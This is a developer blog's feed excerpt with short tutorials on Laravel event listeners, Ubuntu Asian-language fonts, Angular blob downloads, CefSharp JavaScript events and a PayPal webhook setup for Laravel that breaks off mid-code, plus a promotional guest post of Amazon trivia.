    <link href="http://jslim.net/blog/2018/07/11/Laravel-event-multi-listeners-not-working/"/>
    <id>http://jslim.net/blog/2018/07/11/Laravel-event-multi-listeners-not-working/</id>
    <published>2018-07-11T15:13:08.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>The <a href="https://laravel.com/docs/5.6/events">Laravel Event</a> feature is pretty useful, just like <a href="https://dev.mysql.com/doc/refman/8.0/en/triggers.html">Trigger in DBMS</a>;</p><p>I’ve tried to register more than 1 <a href="https://laravel.com/docs/5.6/events#defining-listeners">Listener</a> to an event.</p><p>E.g. in app/Providers/EventServiceProvider.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$listen</span> = [</span><br><span class="line">    <span class="title class_">AccountCreated</span>::<span class="variable language_">class</span> =&gt; [</span><br><span class="line">        <span class="title class_">SendActivationEmail</span>::<span class="variable language_">class</span>,</span><br><span class="line">        SendSMS::<span class="variable language_">class</span>,</span><br><span class="line">    ],</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>Example above shows that once account is created, system will send the activation email automatically, followed by send SMS.</p><p>I’ve encounter the problem that the 2nd listener is not triggered.</p><h3 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h3><p>The reason behind is, there’s a <code>return false;</code> in <code>SendActivationEmail::handler</code>. E.g.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CreateAnnouncementOfferUpdated</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params">AccountCreated <span class="variable">$event</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$event</span>-&gt;account-&gt;is_fb_login) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The <code>return false;</code> indicate that the rest of listeners will not be executed.</p><p>So what I did was, use <code>return;</code> instead of <code>return false;</code>. i.e.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$event</span>-&gt;account-&gt;is_fb_login) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;The &lt;a href=&quot;https://laravel.com/docs/5.6/events&quot;&gt;Laravel Event&lt;/a&gt; feature is pretty useful, just like &lt;a</summary>
        
      
    
    
    
    
    <category term="laravel" scheme="http://jslim.net/tags/laravel/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu server not support chinese character</title>
    <link href="http://jslim.net/blog/2018/05/25/Ubuntu-server-not-support-chinese-character/"/>
    <id>http://jslim.net/blog/2018/05/25/Ubuntu-server-not-support-chinese-character/</id>
    <published>2018-05-25T10:02:43.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>I’m using Amazon EC2, Ubuntu 16.04.</p><p>I noticed this problem when I try to generate a pdf file from php, the filename was not the right chinese character.</p><p><img src="/images/posts/2018-05-25-Ubuntu-server-not-support-chinese-character/chinese-input-not-working.gif" alt="Chinese character not able to input to console"></p><h3 id="Solved"><a href="#Solved" class="headerlink" title="Solved"></a>Solved</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-<span class="built_in">get</span> install language-pack-zh*</span><br><span class="line">$ sudo apt-<span class="built_in">get</span> install chinese*</span><br></pre></td></tr></table></figure><p><em>(If you need korean &amp; japanese language)</em></p><p><strong>Japanese language</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-<span class="built_in">get</span> install language-pack-ja*</span><br><span class="line">$ sudo apt-<span class="built_in">get</span> install japan*</span><br></pre></td></tr></table></figure><p><strong>Korean language</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-<span class="built_in">get</span> install language-pack-ko*</span><br><span class="line">$ sudo apt-<span class="built_in">get</span> install korean*</span><br></pre></td></tr></table></figure><p>Lastly</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install <span class="built_in">fonts</span>-arphic-ukai <span class="built_in">fonts</span>-arphic-uming <span class="built_in">fonts</span>-ipafont-mincho <span class="built_in">fonts</span>-ipafont-gothic <span class="built_in">fonts</span>-unfonts-core</span><br></pre></td></tr></table></figure><p>After installed everything, reboot the server.</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>sudo reboot</span><br></pre></td></tr></table></figure><p>References:</p><ul><li><a href="http://help.accusoft.com/PCC/v11.2/HTML/Installing%20Asian%20Fonts%20on%20Ubuntu%20and%20Debian.html">Installing Asian Fonts on Ubuntu &amp; Debian</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I’m using Amazon EC2, Ubuntu 16.04.&lt;/p&gt;
&lt;p&gt;I noticed this problem when I try to generate a pdf file from php, the filename was not the</summary>
        
      
    
    
    
    
    <category term="linux" scheme="http://jslim.net/tags/linux/"/>
    
    <category term="ubuntu" scheme="http://jslim.net/tags/ubuntu/"/>
    
    <category term="utf-8" scheme="http://jslim.net/tags/utf-8/"/>
    
  </entry>
  
  <entry>
    <title>Guest post: Some Facts About Amazon</title>
    <link href="http://jslim.net/blog/2018/03/26/Guest-post-Some-Facts-About-Amazon/"/>
    <id>http://jslim.net/blog/2018/03/26/Guest-post-Some-Facts-About-Amazon/</id>
    <published>2018-03-26T03:07:31.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>Today’s largest online retailer used to be originally known as ‘Earth’s Largest Bookstore’. They were actually sued for that statement by Barnes &amp; Noble, because the claim was supposedly ‘fake’. The two companies later decided to settle off court.</p><p>It was back in July 1995 when Amazon first opened the virtual doors to its store. At the beginning, this bookstore was situated in a small garage. Nowadays, it’s one of the biggest success stories of the modern world thanks to an ever increasing portfolio of products, mesmerizingly efficient logistics and, generally, <a href="https://www.16best.net/amazon/">very good prices</a> across the board. Amazon’s history has so far been filled with plenty of interesting stories, so we’ve decided to share some with you.</p><p>Back in the old days, Amazon had no inventory. So, whenever customers ordered a book, the employees would have to order it from a bookseller, wait for it to arrive at their offices, and then re-ship it to the buyer. For common titles, people only had to wait for about a week before their order arrived. However, if a book was more difficult to find, people would have to wait for up to a month before getting their order.</p><p>Another interesting fact is the name behind the brand. The owner of Amazon, Jeff Bezos, at first actually wanted to name his bookstore ‘Cadabra’ from the word ‘Abracadabra’. But while talking to the phone with one of his lawyers, he was told that it sounds too much like ‘cadaver,’ which was the reason to pick another name.</p><p>Bezos turned to the dictionary and decided to look up the words under the first letter of the alphabet. He settled on ‘Amazon’ because back when he was just starting out his company, the website listings were ordered alphabetically. Therefore, choosing a name with the first letter of the alphabet meant that his website would sit higher up on these listings.</p><p>There are plenty of other interesting facts and stories that surround Amazon, since it’s been around for the past 23 years. If you’d like to know more, take a look at the infographic below.</p><p>URL: <a href="https://www.16best.net/blog/amazon-ecommerce-leader-infographic/">https://www.16best.net/blog/amazon-ecommerce-leader-infographic/</a></p><p><em>Disclaimer: I did not earn any commission or any benefits from this guest post, other than a back link to my blog. 100% of the content above is not written by me.</em></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Today’s largest online retailer used to be originally known as ‘Earth’s Largest Bookstore’. They were actually sued for that statement</summary>
        
      
    
    
    
    
    <category term="guest-post" scheme="http://jslim.net/tags/guest-post/"/>
    
  </entry>
  
  <entry>
    <title>Angular 4 download file from server via http</title>
    <link href="http://jslim.net/blog/2018/03/13/Angular-4-download-file-from-server-via-http/"/>
    <id>http://jslim.net/blog/2018/03/13/Angular-4-download-file-from-server-via-http/</id>
    <published>2018-03-13T05:17:18.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>When want to download a file from server, usually just provide a <code>&lt;a href...</code> will do. But what if the file only allow authorised user to access? Means you have to download first, in this case will have to use http</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Http</span>, <span class="title class_">ResponseContentType</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@angular/http&#x27;</span>;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="title function_">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">  <span class="keyword">private</span> http: Http,</span></span><br><span class="line"><span class="params"></span>) &#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">downloadFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">http</span></span><br><span class="line">    .<span class="title function_">get</span>(<span class="string">&#x27;https://jslim.net/path/to/file/download&#x27;</span>, &#123;</span><br><span class="line">      <span class="attr">responseType</span>: <span class="title class_">ResponseContentType</span>.<span class="property">Blob</span>,</span><br><span class="line">      <span class="attr">search</span>: <span class="comment">// query string if have</span></span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">map</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">filename</span>: <span class="string">&#x27;filename.pdf&#x27;</span>,</span><br><span class="line">        <span class="attr">data</span>: res.<span class="title function_">blob</span>()</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">subscribe</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;start download:&#x27;</span>,res);</span><br><span class="line">        <span class="keyword">var</span> url = <span class="variable language_">window</span>.<span class="property">URL</span>.<span class="title function_">createObjectURL</span>(res.<span class="property">data</span>);</span><br><span class="line">        <span class="keyword">var</span> a = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(a);</span><br><span class="line">        a.<span class="title function_">setAttribute</span>(<span class="string">&#x27;style&#x27;</span>, <span class="string">&#x27;display: none&#x27;</span>);</span><br><span class="line">        a.<span class="property">href</span> = url;</span><br><span class="line">        a.<span class="property">download</span> = res.<span class="property">filename</span>;</span><br><span class="line">        a.<span class="title function_">click</span>();</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">URL</span>.<span class="title function_">revokeObjectURL</span>(url);</span><br><span class="line">        a.<span class="title function_">remove</span>(); <span class="comment">// remove the element</span></span><br><span class="line">      &#125;, <span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;download error:&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(error));</span><br><span class="line">      &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Completed file download.&#x27;</span>)</span><br><span class="line">      &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Make sure change the <strong>responseType</strong> to <code>ResponseContentType.Blob</code>.</p><p>Then, in the html file</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span> (<span class="attr">click</span>)=<span class="string">&quot;downloadFile()&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;fa fa-file-pdf-o&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> Download<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Now, users are able to download the file when click on the button.</p><h3 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h3><ul><li><a href="https://stackoverflow.com/questions/19327749/javascript-blob-filename-without-link/19328891#19328891">JavaScript blob filename without link</a></li><li><a href="https://stackoverflow.com/questions/35138424/how-do-i-download-a-file-with-angular2/35227885#35227885">How do I download a file with Angular2</a></li><li><a href="https://amitsethi0843.wordpress.com/2017/06/04/angular-24-file-download-from-web-api/">Angular 2/4 file download from web api</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;When want to download a file from server, usually just provide a &lt;code&gt;&amp;lt;a href...&lt;/code&gt; will do. But what if the file only allow</summary>
        
      
    
    
    
    
    <category term="angular" scheme="http://jslim.net/tags/angular/"/>
    
    <category term="http" scheme="http://jslim.net/tags/http/"/>
    
  </entry>
  
  <entry>
    <title>CefSharp listen to JavaScript event</title>
    <link href="http://jslim.net/blog/2018/01/30/CefSharp-listen-to-JavaScript-event/"/>
    <id>http://jslim.net/blog/2018/01/30/CefSharp-listen-to-JavaScript-event/</id>
    <published>2018-01-30T07:23:45.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/cefsharp/CefSharp">CefSharp</a> is a Chromium browser embedded to an application.</p><p>In my case, I’m using WinForms <em>(CefSharp.WinForms v57.0.0)</em>.</p><h3 id="What-I-want-to-achieve-here"><a href="#What-I-want-to-achieve-here" class="headerlink" title="What I want to achieve here:"></a>What I want to achieve here:</h3><p>When user click on the <code>&lt;a&gt;</code> element, the C# code there need to perform some action.</p><h3 id="How-it-can-be-done"><a href="#How-it-can-be-done" class="headerlink" title="How it can be done"></a>How it can be done</h3><p>In <strong>C#</strong> code</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">InitBrowser</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    browser = <span class="keyword">new</span> ChromiumWebBrowser(<span class="string">&quot;http://yoursite.com&quot;</span>);</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> eventObject = <span class="keyword">new</span> ScriptedMethodsBoundObject();</span><br><span class="line">    eventObject.EventArrived += OnJavascriptEventArrived;</span><br><span class="line">    browser.RegisterJsObject(<span class="string">&quot;boundEvent&quot;</span>, eventObject, options: BindingOptions.DefaultBinder);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">OnJavascriptEventArrived</span>(<span class="params"><span class="built_in">string</span> eventName, <span class="built_in">object</span> eventData</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> jsonString = eventData.ToString();</span><br><span class="line">    <span class="keyword">var</span> serializer = <span class="keyword">new</span> System.Web.Script.Serialization.JavaScriptSerializer();</span><br><span class="line">    <span class="keyword">var</span> dataDict = serializer.Deserialize&lt;Dictionary&lt;<span class="built_in">string</span>, <span class="built_in">object</span>&gt;&gt;(jsonString);</span><br><span class="line"></span><br><span class="line">    Console.WriteLine(<span class="string">&quot;Event arrived: &#123;0&#125;&quot;</span>, eventName); <span class="comment">// output &#x27;click&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (eventName)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;click&quot;</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// do whatever you want here</span></span><br><span class="line">            Console.WriteLine(dataDict[<span class="string">&quot;data1&quot;</span>]); <span class="comment">// output &#x27;foo&#x27;</span></span><br><span class="line">            Console.WriteLine(dataDict[<span class="string">&quot;data2&quot;</span>]); <span class="comment">// output &#x27;bar&#x27;</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In <strong>JavaScript</strong> code</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&#x27;a&#x27;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable language_">window</span>.<span class="property">boundEvent</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;window.boundEvent does not exist.&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;   </span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">boundEvent</span>.<span class="title function_">raiseEvent</span>(<span class="string">&#x27;click&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">    <span class="attr">data1</span>: <span class="string">&#x27;foo&#x27;</span>,</span><br><span class="line">    <span class="attr">data2</span>: <span class="string">&#x27;bar&#x27;</span></span><br><span class="line">  &#125;));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/cefsharp/CefSharp&quot;&gt;CefSharp&lt;/a&gt; is a Chromium browser embedded to an application.&lt;/p&gt;
&lt;p&gt;In my case, I’m</summary>
        
      
    
    
    
    
    <category term="c#" scheme="http://jslim.net/tags/c/"/>
    
    <category term="cefsharp" scheme="http://jslim.net/tags/cefsharp/"/>
    
  </entry>
  
  <entry>
    <title>PayPal Rest API with Laravel 5 and Angular</title>
    <link href="http://jslim.net/blog/2018/01/22/PayPal-Rest-API-with-Laravel-5-and-Angular/"/>
    <id>http://jslim.net/blog/2018/01/22/PayPal-Rest-API-with-Laravel-5-and-Angular/</id>
    <published>2018-01-22T06:35:45.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>Previously I wrote a post regarding to <a href="/blog/2014/09/19/integrate-paypal-sdk-into-laravel-4/">Integrate PayPal SDK into Laravel 4</a>. And I believe now Laravel 5 is quite different from Laravel 4. Also, PayPal API also updated now.</p><p>This post involved Front End (Angular 5) &amp; Back End (Laravel 5).</p><p>And I assumed you know how to create PayPal account <em>(<a href="/blog/2014/09/19/integrate-paypal-sdk-into-laravel-4/">you may refer here if needed</a>)</em>.</p><h2 id="In-Laravel-5"><a href="#In-Laravel-5" class="headerlink" title="In Laravel 5"></a>In Laravel 5</h2><p><em>(Assumed that you’re terminal always in the project root)</em></p><h3 id="1-Install-the-PayPal-SDK"><a href="#1-Install-the-PayPal-SDK" class="headerlink" title="1. Install the PayPal SDK"></a>1. Install the PayPal SDK</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ composer install paypal/rest-api-sdk-php --save</span><br></pre></td></tr></table></figure><h3 id="2-Add-PayPal-config"><a href="#2-Add-PayPal-config" class="headerlink" title="2. Add PayPal config"></a>2. Add PayPal config</h3><p><strong>config/paypal.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="string">&#x27;client_id&#x27;</span> =&gt; <span class="title function_ invoke__">env</span>(<span class="string">&#x27;PAYPAL_CLIENT_ID&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;secret&#x27;</span> =&gt; <span class="title function_ invoke__">env</span>(<span class="string">&#x27;PAYPAL_CLIENT_SECRET&#x27;</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * SDK configuration </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="string">&#x27;settings&#x27;</span> =&gt; [</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Available option &#x27;sandbox&#x27; or &#x27;live&#x27;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="string">&#x27;mode&#x27;</span> =&gt; <span class="string">&#x27;sandbox&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Specify the max request time in seconds</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="string">&#x27;http.ConnectionTimeOut&#x27;</span> =&gt; <span class="number">30</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Whether want to log to a file</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="string">&#x27;log.LogEnabled&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Specify the file that want to write on</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="string">&#x27;log.FileName&#x27;</span> =&gt; <span class="title function_ invoke__">storage_path</span>() . <span class="string">&#x27;/logs/paypal.log&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Available option &#x27;FINE&#x27;, &#x27;INFO&#x27;, &#x27;WARN&#x27; or &#x27;ERROR&#x27;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * Logging is most verbose in the &#x27;FINE&#x27; level and decreases as you</span></span><br><span class="line"><span class="comment">         * proceed towards ERROR</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="string">&#x27;log.LogLevel&#x27;</span> =&gt; <span class="string">&#x27;FINE&#x27;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&#x27;webhooks&#x27;</span> =&gt; [</span><br><span class="line">        <span class="string">&#x27;payment_sale_completed&#x27;</span> =&gt; <span class="title function_ invoke__">env</span>(<span class="string">&#x27;PAYPAL_PAYMENT_SALE_COMPLETED_WEBHOOK_ID&#x27;</span>),</span><br><span class="line">    ],</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>Add the following content to <strong>.env</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">PAYPAL_CLIENT_ID</span>=AcT3DS8a-SmTEtSl9hNcwyscoLypndD9q5L0YcfxmaUavz3p_xwFNRE-OauO</span><br><span class="line"><span class="attr">PAYPAL_CLIENT_SECRET</span>=ENv8_RCXMfhcrzdSfAWjLWDiD_GJSD-Gbm5q2Pj92vIuobCtgLpR3SUxqAhZ</span><br><span class="line"><span class="attr">PAYPAL_PAYMENT_SALE_COMPLETED_WEBHOOK_ID</span>=CTU22487IE5K8012E</span><br></pre></td></tr></table></figure><h3 id="3-PayPal-callback-handler-Webhooks"><a href="#3-PayPal-callback-handler-Webhooks" class="headerlink" title="3. PayPal callback handler (Webhooks)"></a>3. PayPal callback handler <em>(Webhooks)</em></h3><p>Now we practice <a href="https://developer.paypal.com/docs/integration/direct/webhooks/">Webhooks</a> here.</p><p>Let’s login to <a href="https://developer.paypal.com/">PayPal developer console</a>. <em>(I assumed you already created an app)</em></p><p><img src="/images/posts/2018-01-22-PayPal-Rest-API-with-Laravel-5-and-Angular/paypal-app.png" alt="PayPal app"></p><ol><li>Click on <strong>My Apps &amp; Credentials</strong></li><li>Look for <strong>REST API apps</strong></li><li>Click on the app you want to deal with</li></ol><p><img src="/images/posts/2018-01-22-PayPal-Rest-API-with-Laravel-5-and-Angular/add-webhooks.png" alt="PayPal add sandbox webhooks"></p><p>Then look for <strong>SANDBOX WEBHOOKS</strong> section. You can add any call back here with the URL route you want to handle.</p><p>In my side, I selected <strong>Payment Sale Completed</strong>. Which mean every time the payment sucessfully made, PayPal will trigger the URL there in POST request.</p><h3 id="4-Now-let’s-create-a-handler-in-your-controller"><a href="#4-Now-let’s-create-a-handler-in-your-controller" class="headerlink" title="4. Now let’s create a handler in your controller"></a>4. Now let’s create a handler in your controller</h3><p>Edit the <strong>routes/api.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">group</span>([<span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;webhooks&#x27;</span>], function () &#123;</span><br><span class="line">    <span class="title class_">Route</span>::<span class="title function_ invoke__">post</span>(<span class="string">&#x27;paypal/payment-sale-completed&#x27;</span>, [<span class="string">&#x27;uses&#x27;</span> =&gt; <span class="string">&#x27;PayPalController@webhooksPaymentSaleCompleted&#x27;</span>]);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Then create a controller <strong>app/Http/Controllers/PayPalController.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 